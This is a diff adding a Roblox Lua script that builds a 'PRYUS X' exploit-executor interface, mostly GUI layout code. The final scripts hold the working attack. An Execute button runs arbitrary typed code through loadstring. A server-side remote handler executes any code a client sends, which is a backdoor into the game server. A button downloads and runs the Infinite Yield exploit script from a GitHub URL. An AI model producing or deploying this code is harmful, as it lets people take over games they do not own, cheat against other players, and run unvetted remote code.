@@ -1,0 +1,368 @@
+-- Instances:
+
+local HiGui = Instance.new("ScreenGui")
+local PryusxGui = Instance.new("Frame")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Frame_2 = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local UICorner_2 = Instance.new("UICorner")
+local ImageLabel = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
+local Frame_3 = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local ImageButton = Instance.new("ImageButton")
+local UICorner_5 = Instance.new("UICorner")
+local Clear = Instance.new("ImageButton")
+local UICorner_6 = Instance.new("UICorner")
+local Execute = Instance.new("ImageButton")
+local UICorner_7 = Instance.new("UICorner")
+local TextButton = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local TextButton_2 = Instance.new("TextButton")
+local UICorner_9 = Instance.new("UICorner")
+local Scriptsr = Instance.new("Frame")
+local TextButton_3 = Instance.new("TextButton")
+local TextButton_4 = Instance.new("TextButton")
+local TextButton_5 = Instance.new("TextButton")
+local TextButton_6 = Instance.new("TextButton")
+local TextButton_7 = Instance.new("TextButton")
+local TextButton_8 = Instance.new("TextButton")
+local TextButton_9 = Instance.new("TextButton")
+
+--Properties:
+
+HiGui.Name = "HiGui"
+HiGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+HiGui.ResetOnSpawn = false
+
+PryusxGui.Name = "PryusxGui"
+PryusxGui.Parent = HiGui
+PryusxGui.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
+PryusxGui.BorderColor3 = Color3.fromRGB(0, 0, 0)
+PryusxGui.BorderSizePixel = 0
+PryusxGui.Position = UDim2.new(0.299726129, 0, 0.20804438, 0)
+PryusxGui.Size = UDim2.new(0.400409132, 0, 0.580790579, 0)
+
+Frame.Parent = PryusxGui
+Frame.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+Frame.BorderColor3 = Color3.fromRGB(255, 123, 8)
+Frame.BorderSizePixel = 0
+Frame.Size = UDim2.new(1, 0, 0.0515695028, 0)
+
+UICorner.Parent = Frame
+
+Frame_2.Parent = PryusxGui
+Frame_2.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+Frame_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(0, 0, 0.0313901342, 0)
+Frame_2.Size = UDim2.new(1, 0, 0.0650224239, 0)
+
+TextBox.Parent = PryusxGui
+TextBox.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+TextBox.BackgroundTransparency = 0.100
+TextBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BorderSizePixel = 3
+TextBox.Position = UDim2.new(0.237375185, 0, 0.335226268, 0)
+TextBox.Size = UDim2.new(0.728480279, 0, 0.617782474, 0)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderText = "print(\"PRYUSX W\")"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(178, 178, 178)
+TextBox.TextSize = 14.000
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+UICorner_2.Parent = TextBox
+
+ImageLabel.Parent = PryusxGui
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.0149533302, 0, 0.00742448075, 0)
+ImageLabel.Size = UDim2.new(0.0609167926, 0, 0.0889880732, 0)
+ImageLabel.Image = "rbxassetid://17261568563"
+
+TextLabel.Parent = PryusxGui
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.162265301, 0, 0.0154867247, 0)
+TextLabel.Size = UDim2.new(0.0750324652, 0, 0.0964125395, 0)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "PRYUS X"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 35.000
+
+TextLabel_2.Parent = PryusxGui
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.328291684, 0, 0.0251235943, 0)
+TextLabel_2.Size = UDim2.new(0.0750324652, 0, 0.0811518356, 0)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "V1.1.3"
+TextLabel_2.TextColor3 = Color3.fromRGB(104, 104, 104)
+TextLabel_2.TextSize = 13.000
+
+UICorner_3.Parent = PryusxGui
+
+Frame_3.Parent = PryusxGui
+Frame_3.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+Frame_3.BorderColor3 = Color3.fromRGB(255, 123, 8)
+Frame_3.BorderSizePixel = 0
+Frame_3.Position = UDim2.new(4.16328696e-08, 0, 0.112565443, 0)
+Frame_3.Size = UDim2.new(0.99999994, 0, 0.00782991387, 0)
+
+UICorner_4.Parent = Frame_3
+
+ImageButton.Parent = PryusxGui
+ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageButton.BorderSizePixel = 0
+ImageButton.Position = UDim2.new(0.915014386, 0, 0.136125654, 0)
+ImageButton.Size = UDim2.new(0.0495750792, 0, 0.0761362985, 0)
+ImageButton.Image = "rbxassetid://17643281693"
+
+UICorner_5.CornerRadius = UDim.new(100000, 0)
+UICorner_5.Parent = ImageButton
+
+Clear.Name = "Clear"
+Clear.Parent = PryusxGui
+Clear.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Clear.BorderSizePixel = 0
+Clear.Position = UDim2.new(0.841360033, 0, 0.136125654, 0)
+Clear.Size = UDim2.new(0.0495750792, 0, 0.0761362985, 0)
+Clear.Visible = false
+Clear.Image = "rbxassetid://17643279110"
+
+UICorner_6.CornerRadius = UDim.new(100000, 0)
+UICorner_6.Parent = Clear
+
+Execute.Name = "Execute"
+Execute.Parent = PryusxGui
+Execute.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Execute.BorderSizePixel = 0
+Execute.Position = UDim2.new(0.769122005, 0, 0.136125654, 0)
+Execute.Size = UDim2.new(0.0495750792, 0, 0.0761362985, 0)
+Execute.Visible = false
+Execute.Image = "rbxassetid://17643295653"
+
+UICorner_7.CornerRadius = UDim.new(100000, 0)
+UICorner_7.Parent = Execute
+
+TextButton.Parent = PryusxGui
+TextButton.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0.236543953, 0, 0.227876127, 0)
+TextButton.Size = UDim2.new(0.18050541, 0, 0.0866851583, 0)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Tab 1"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 20.000
+TextButton.TextWrapped = true
+
+UICorner_8.Parent = TextButton
+
+TextButton_2.Parent = PryusxGui
+TextButton_2.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.BorderSizePixel = 0
+TextButton_2.Position = UDim2.new(0.437677115, 0, 0.227876127, 0)
+TextButton_2.Size = UDim2.new(0.18050541, 0, 0.0866851583, 0)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "Tab 2"
+TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.TextSize = 20.000
+TextButton_2.TextWrapped = true
+
+UICorner_9.Parent = TextButton_2
+
+Scriptsr.Name = "Scriptsr"
+Scriptsr.Parent = PryusxGui
+Scriptsr.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Scriptsr.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Scriptsr.BorderSizePixel = 0
+Scriptsr.Position = UDim2.new(0.0141643081, 0, 0.152654842, 0)
+Scriptsr.Size = UDim2.new(0.198300317, 0, 0.800353885, 0)
+Scriptsr.Visible = false
+
+TextButton_3.Parent = Scriptsr
+TextButton_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.BorderSizePixel = 0
+TextButton_3.Size = UDim2.new(1, 0, 0.138213202, 0)
+TextButton_3.Font = Enum.Font.SourceSans
+TextButton_3.Text = "Infinte Yield"
+TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_3.TextSize = 20.000
+
+TextButton_4.Parent = Scriptsr
+TextButton_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_4.BorderSizePixel = 0
+TextButton_4.Position = UDim2.new(0, 0, 0.138213202, 0)
+TextButton_4.Size = UDim2.new(1, 0, 0.138213202, 0)
+TextButton_4.Font = Enum.Font.SourceSans
+TextButton_4.Text = "Infinte Yield"
+TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_4.TextSize = 20.000
+
+TextButton_5.Parent = Scriptsr
+TextButton_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_5.BorderSizePixel = 0
+TextButton_5.Position = UDim2.new(0, 0, 0.276426405, 0)
+TextButton_5.Size = UDim2.new(1, 0, 0.138213202, 0)
+TextButton_5.Font = Enum.Font.SourceSans
+TextButton_5.Text = "Infinte Yield"
+TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_5.TextSize = 20.000
+
+TextButton_6.Parent = Scriptsr
+TextButton_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_6.BorderSizePixel = 0
+TextButton_6.Position = UDim2.new(0, 0, 0.414639592, 0)
+TextButton_6.Size = UDim2.new(1, 0, 0.138213202, 0)
+TextButton_6.Font = Enum.Font.SourceSans
+TextButton_6.Text = "Infinte Yield"
+TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_6.TextSize = 20.000
+
+TextButton_7.Parent = Scriptsr
+TextButton_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_7.BorderSizePixel = 0
+TextButton_7.Position = UDim2.new(0, 0, 0.552852809, 0)
+TextButton_7.Size = UDim2.new(1, 0, 0.138213202, 0)
+TextButton_7.Font = Enum.Font.SourceSans
+TextButton_7.Text = "Infinte Yield"
+TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_7.TextSize = 20.000
+
+TextButton_8.Parent = Scriptsr
+TextButton_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_8.BorderSizePixel = 0
+TextButton_8.Position = UDim2.new(0, 0, 0.691066027, 0)
+TextButton_8.Size = UDim2.new(1, 0, 0.138213202, 0)
+TextButton_8.Font = Enum.Font.SourceSans
+TextButton_8.Text = "Infinte Yield"
+TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_8.TextSize = 20.000
+
+TextButton_9.Parent = Scriptsr
+TextButton_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_9.BorderSizePixel = 0
+TextButton_9.Position = UDim2.new(0, 0, 0.829279184, 0)
+TextButton_9.Size = UDim2.new(1, 0, 0.138213202, 0)
+TextButton_9.Font = Enum.Font.SourceSans
+TextButton_9.Text = "Infinte Yield"
+TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_9.TextSize = 20.000
+
+-- Scripts:
+
+local function MLOX_fake_script() -- PryusxGui.Drag 
+	local script = Instance.new('LocalScript', PryusxGui)
+
+	
+	local UIS = game:GetService("UserInputService")
+	function dragify(Frame)
+	    dragToggle = nil
+	    local dragSpeed = 0
+	    dragInput = nil
+	    dragStart = nil
+	    local dragPos = nil
+	    function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
+	    end
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+	    end)
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+	    end)
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	dragify(script.Parent)
+end
+coroutine.wrap(MLOX_fake_script)()
+local function YIJN_fake_script() -- ImageButton.LocalScript 
+	local script = Instance.new('LocalScript', ImageButton)
+
+	local execute = script.Parent.Parent.Execute
+	local clear = script.Parent.Parent.Clear
+	local scripts = script.Parent.Parent.Scriptsr
+	script.Parent.MouseButton1Click:Connect(function()
+		execute.Visible = true
+		clear.Visible = true
+		scripts.Visible = true
+		script.Parent.Visible = false
+	end)
+end
+coroutine.wrap(YIJN_fake_script)()
+local function ZJWJ_fake_script() -- Clear.LocalScript 
+	local script = Instance.new('LocalScript', Clear)
+
+	local textbox = script.Parent.Parent.TextBox
+	script.Parent.MouseButton1Click:Connect(function()
+		textbox.Text = ""
+	end)
+end
+coroutine.wrap(ZJWJ_fake_script)()
+local function TTIZE_fake_script() -- Execute.LocalScript 
+	local script = Instance.new('LocalScript', Execute)
+
+	local textbox = script.Parent.Parent.TextBox
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(textbox.Text)()
+	end)
+end
+coroutine.wrap(TTIZE_fake_script)()
+local function RHZLSS_fake_script() -- Execute.Script 
+	local script = Instance.new('Script', Execute)
+
+	remote = script.Parent.ExecuteScript
+	
+	remote.OnServerEvent:Connect(function(idk, lol)
+		require(script.Loadstring)(lol)()
+	end)
+end
+coroutine.wrap(RHZLSS_fake_script)()
+local function IYCYK_fake_script() -- TextButton_3.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_3)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/DarkNetworks/Infinite-Yield/main/latest.lua'))()
+	end)
+end
+coroutine.wrap(IYCYK_fake_script)()
